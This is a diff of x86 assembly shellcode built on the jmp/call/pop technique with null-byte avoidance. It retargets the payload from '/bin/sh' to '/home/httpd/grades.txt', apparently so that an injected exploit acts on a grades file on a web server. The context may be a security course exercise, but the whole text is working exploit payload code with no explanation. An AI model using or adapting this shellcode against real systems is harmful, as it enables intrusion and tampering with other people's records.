@@ -1,7 +1,7 @@
 #include <sys/syscall.h>
 
-#define STRING	"/bin/sh"
-#define STRLEN	7
+#define STRING	"/home/httpd/grades.txt"
+#define STRLEN	22
 #define ARGV	(STRLEN+1)
 #define ENVP	(ARGV+4)
 
@@ -11,7 +11,7 @@
  main:
 	jmp	calladdr
 
-popladdr:
+ popladdr:
 	popl	%esi
 	movl	%esi,(ARGV)(%esi)	/* set up argv pointer to pathname */
 	xorl	%eax,%eax		/* get a 32-bit zero value */
@@ -33,8 +33,7 @@ popladdr:
 	inc	%eax			/* syscall arg 1: SYS_exit (1), uses */
 					/* mov+inc to avoid null byte */
 	int	$0x80			/* invoke syscall */
- 
- 
+
  calladdr:
 	call	popladdr
-	.ascii	STRING
+	.string	STRING
